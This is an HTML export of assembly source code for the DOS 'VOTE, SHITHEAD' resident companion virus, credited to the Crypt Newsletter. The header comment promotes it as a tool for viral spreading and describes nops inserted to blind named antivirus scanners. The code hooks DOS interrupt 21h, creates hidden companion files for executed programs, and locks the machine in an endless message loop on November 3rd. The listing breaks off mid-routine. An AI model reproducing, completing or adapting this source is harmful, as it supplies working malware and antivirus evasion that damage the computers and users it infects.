<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*  VOTE, SHITHEAD! virus   Edited by URNST KOUCH for the Crypt Newsletter 7.</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*  TASM/MASM compatible source listing</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*  VOTE, SHITHEAD is a resident, companion virus based upon Little </span><span class="sc0">
</span><span class="sc1">;*  Brother code and library .asm routines extracted from Nowhere Man's VCL.</span><span class="sc0">
</span><span class="sc1">;*  It is also 'patched' with three 'nops' (they are commented) which </span><span class="sc0">
</span><span class="sc1">;*  effectively blind a number of a-v scanners. This simple alteration</span><span class="sc0">
</span><span class="sc1">;*  demonstrates a practical benefit of source code possession: quick </span><span class="sc0">
</span><span class="sc1">;*  generation of different virus strains becomes a task within anyone's </span><span class="sc0">
</span><span class="sc1">;*  reach. The only tools needed are a number of virus scanners and patience.</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*  In any case, the VOTE virus is just the ideal sample needed for</span><span class="sc0">
</span><span class="sc1">;*  judicious virus action. It is a PERFECT tool for viral spreading for</span><span class="sc0">
</span><span class="sc1">;*  a number of reasons.  First, it is a FAST infector. Once resident</span><span class="sc0">
</span><span class="sc1">;*  VOTE will create a companion file for ANY .EXE executed on ANY drive</span><span class="sc0">
</span><span class="sc1">;*  and it will do it so quickly that most users, even suspicious ones,</span><span class="sc0">
</span><span class="sc1">;*  will not notice any slowdown or glitches in machine operation.</span><span class="sc0">
</span><span class="sc1">;*  Second, 'companion-ed' .EXE's will continue to load and function</span><span class="sc0">
</span><span class="sc1">;*  properly when VOTE is resident. At the start of the day's computing,</span><span class="sc0">
</span><span class="sc1">;*  the first 'companion-ed' .EXE executed will misfire ONCE as the virus</span><span class="sc0">
</span><span class="sc1">;*  becomes resident. If it is re-called it will function perfectly.</span><span class="sc0">
</span><span class="sc1">;*  Third, VOTE like the INSUFF viruses in the last newsletter strikes</span><span class="sc0">
</span><span class="sc1">;*  directly at anti-virus suites vulnerable to 'spawning' infections (many</span><span class="sc0">
</span><span class="sc1">;*  no-names, CPAV, NAV) and creates 'hidden' companion files, an improvement</span><span class="sc0">
</span><span class="sc1">;*  over the original virus's modus operandi which left them out in plane</span><span class="sc0">
</span><span class="sc1">;*  sight in the directory. Last, VOTE is very small. In RAM, it is not </span><span class="sc0">
</span><span class="sc1">;*  discernible, taking up slightly less that 0.25k. Characteristically,</span><span class="sc0">
</span><span class="sc1">;*  this is NOT reported by a mem /c display. In fact, </span><span class="sc0">
</span><span class="sc1">;*  VOTE is almost invisible to any number of standard diagnostic </span><span class="sc0">
</span><span class="sc1">;*  tests. Memory maps by QEMM and Norton's SYSINFO will </span><span class="sc0">
</span><span class="sc1">;*  report INT 21 hooked differently. But unless the user can compare</span><span class="sc0">
</span><span class="sc1">;*  an uncontaminated INTERRUPT report with one when the virus IS present, </span><span class="sc0">
</span><span class="sc1">;*  it's unlikely he'll know anything is different. Even then, VOTE is hard</span><span class="sc0">
</span><span class="sc1">;*  to notice. </span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*  On election day, November 3rd, VOTE will lock an infected machine into </span><span class="sc0">
</span><span class="sc1">;*  a loop as it displays a "DID YOU VOTE, SHITHEAD??" query repetitively</span><span class="sc0">
</span><span class="sc1">;*  across the monitor. Computing will be impossible on Nov. 3rd</span><span class="sc0">
</span><span class="sc1">;*  unless VOTE is removed from the machine, a task accomplished by unmasking</span><span class="sc0">
</span><span class="sc1">;*  all the hidden .COMfiles and deleting them while</span><span class="sc0">
</span><span class="sc1">;*  the virus is NOT resident. At all other times, VOTE is almost completely</span><span class="sc0">
</span><span class="sc1">;*  transparent.</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">            </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">

        </span><span class="sc9">.RADIX</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">


</span><span class="sc5">oi21</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">endit</span><span class="sc0">
</span><span class="sc5">nameptr</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">endit</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">endit</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*    Check for activation date, then proceed to installation!</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_day</span><span class="sc0">       </span><span class="sc1">; Get the day, DOS time/date grab</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">      </span><span class="sc1">; Did the function return the 3rd?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">realstrt</span><span class="sc0">      </span><span class="sc1">; If equal, continue along stream</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_month</span><span class="sc0">     </span><span class="sc1">; Get the month, DOS time/date grab</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000Bh</span><span class="sc0">      </span><span class="sc1">; Did the function return November (11)?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">realstrt</span><span class="sc0">      </span><span class="sc1">; If equal, continue to blooie; if not</span><span class="sc0">
                      </span><span class="sc1">; skip to loading of virus</span><span class="sc0">


</span><span class="sc5">blooie</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">shithead</span><span class="sc0">  </span><span class="sc1">;load 'shithead' message</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                 </span><span class="sc1">;display it and loop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                  </span><span class="sc1">;endlessly until</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">blooie</span><span class="sc0">               </span><span class="sc1">;user becomes ill and reboots</span><span class="sc0">

</span><span class="sc5">realstrt</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0044h</span><span class="sc0">      </span><span class="sc1">;move VOTE SHITHEAD to empty hole in RAM</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">                   </span><span class="sc1">;a 'nop' to confuse tbSCAN</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">                   </span><span class="sc1">;a 'nop' to confuse Datatechnik's AVscan</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endit</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">  </span><span class="sc1">;length of SHITHEAD into cx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">;get original int21 vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0084h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oi21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ni21</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">;check to see if virus is around</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cancel</span><span class="sc0">            </span><span class="sc1">; by comparing new interrupt (ni21)</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                     </span><span class="sc1">; vector to current, if it looks</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                     </span><span class="sc1">; the same 'cancel' operation</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;set vector to new handler</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">cancel</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*    File-extension masks for checking and naming routines;message text</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">EXE_txt</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">COM_txt</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SHITHEAD</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"DID YOU VOTE, SHITHEAD??"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Interrupt handler 24</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">ni24</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">   </span><span class="sc1">;virus critical error handler</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">;prevents embarrassing messages</span><span class="sc0">
                </span><span class="sc1">;on attempted writes to protected disks</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Interrupt handler 21</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">ni21</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">         </span><span class="sc1">;now that we're installed</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit</span><span class="sc0">             </span><span class="sc1">; check for 4B00, DOS excutions</span><span class="sc0">

</span><span class="sc5">doit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">          </span><span class="sc1">; if one comes by, grab it</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">; if anything else, goto sleep</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oi21</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;call to old int-handler</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Try to infect a file (ptr to ASCIIZ-name is DS:DX)</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nameptr</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">;save the ptr to the filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nameptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                  </span><span class="sc1">;get old DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;set new DTA</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">searchpoint</span><span class="sc0">            </span><span class="sc1">; here's where we grab a name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; for ourselves</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">COM_txt</span><span class="sc0">       </span><span class="sc1">;is extension 'COM'?</span><span class="sc0">
                        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">do_com</span><span class="sc0">                </span><span class="sc1">;if so, go to our .COM routine </span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXE_txt</span><span class="sc0">     </span><span class="sc1">;is extension 'EXE'?</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">                           </span><span class="sc1">;'nop' to confuse SCAN v95b.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">                 
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">return</span><span class="sc0">

</span><span class="sc5">do_exe</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">COM_txt</span><span class="sc0">     </span><span class="sc1">;change extension to COM</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">                           </span><span class="sc1">;another 'nop' to confuse SCAN</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">change_ext</span><span class="sc0">             

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3300h</span><span class="sc0">              </span><span class="sc1">;get ctrl-break flag</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">                    
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">cwd</span><span class="sc0">                           </span><span class="sc1">;clear the flag</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">              </span><span class="sc1">;get int24 vector</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">                    
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                    
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                    </span><span class="sc1">;set int24 vector to new handler</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                    </span><span class="sc1">;virus handles machine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ni24</span><span class="sc0">        </span><span class="sc1">;exits on attempted writes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">                </span><span class="sc1">;to write-protected disks </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nameptr</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;create the virus (with name of .EXE target)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Ch</span><span class="sc0">                </span><span class="sc1">; DOS create file function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100111b</span><span class="sc0">           </span><span class="sc1">; CX holds file attributes (all)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">                   </span><span class="sc1">; makes it hidden/system/read-only</span><span class="sc0">
                           </span><span class="sc1">; do it</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;save handle</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endit</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">        </span><span class="sc1">; write the virus to the created file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">         </span><span class="sc1">; CX contains length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write to file function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">;close the file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">


</span><span class="sc5">return1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore int24 vector</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore ctrl-break flag</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXE_txt</span><span class="sc0">       </span><span class="sc1">;change extension to EXE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">change_ext</span><span class="sc0">              </span><span class="sc1">;execute EXE-file</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                  </span><span class="sc1">;restore old DTA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_com</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">findfirst</span><span class="sc0">               </span><span class="sc1">;is the COM-file a virus?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">DTA</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc5">endit</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">  </span><span class="sc1">;compare it to virus length</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">return</span><span class="sc0">                  </span><span class="sc1">;no, so execute COM-file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXE_txt</span><span class="sc0">       </span><span class="sc1">;does the EXE-variant exist?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">change_ext</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">findfirst</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">return</span><span class="sc0">                  </span><span class="sc1">;yes, execute EXE-file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">COM_txt</span><span class="sc0">       </span><span class="sc1">;change extension to COM</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">change_ext</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">            </span><span class="sc1">;execute COM-file</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Search beginning of extension for name we will usurp  </span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">searchpoint</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nameptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*          Change the extension of the filename (CS:SI -&gt; ext)</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">change_ext</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">searchpoint</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
